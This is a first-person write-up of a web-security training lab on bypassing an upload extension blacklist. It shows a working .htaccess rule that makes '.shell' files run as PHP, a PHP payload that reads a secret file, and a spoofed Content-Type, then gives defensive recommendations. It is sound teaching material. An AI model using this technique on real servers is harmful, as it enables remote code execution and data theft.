# Lab: Web Shell Upload via Extension Blacklist Bypass

## Objective:
Bypass the application's extension blacklist by modifying the Apache configuration, upload a PHP web shell, retrieve Carlos's secret, and solve the lab.

--- 

## Steps:

1. I logged into my account using the provided credentials:

Username: wiener
Password: peter

2. I noticed that PHP files were blocked by an extension blacklist.

3. Instead of trying to bypass the blacklist directly, I uploaded an Apache configuration file named:

.htaccess

4. The contents of the .htaccess file were:

AddType application/x-httpd-php .shell

This instructs Apache to treat files with the ".shell" extension as PHP scripts.

5. The upload was accepted and the server responded with HTTP 200 OK, confirming that the .htaccess file had been successfully uploaded.

6. Next, I uploaded a second file named:

shell.shell

7. The file contained the following PHP payload:
   
```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```
I kept the Content-Type as:

Content-Type: image/jpeg

to satisfy the application's upload checks.

8. Since Apache had already been configured to execute ".shell" files as PHP, I accessed:

GET /files/avatars/shell.shell

9. The server executed the PHP payload and returned Carlos's secret:

bW9UJbSxqcVRSMvh6066O2v6GjjjCs2e

10. I copied the secret and submitted it.

The lab was successfully solved.

---
## Vulnerability:
Web Shell Upload via Extension Blacklist Bypass

## Cause:
The application relied on a blacklist to block dangerous extensions such as ".php" but allowed the upload of arbitrary configuration files like ".htaccess".

By uploading a custom .htaccess file, it was possible to redefine how Apache handled file extensions, causing files with the ".shell" extension to be interpreted as PHP scripts.

This completely bypassed the blacklist.

## Takeaway:
Blacklisting dangerous extensions is not sufficient to secure file uploads.

When testing upload functionality, always check whether configuration files such as:

- .htaccess
- web.config

can be uploaded.

If the web server allows configuration changes through uploaded files, attackers may redefine executable extensions and achieve Remote Code Execution even when PHP files are explicitly blocked.

## A secure implementation should:

- Block configuration files from being uploaded.
- Store uploaded files outside the web root.
- Disable script execution inside upload directories.
- Use a strict whitelist of allowed extensions.
- Validate the file contents in addition to the extension.
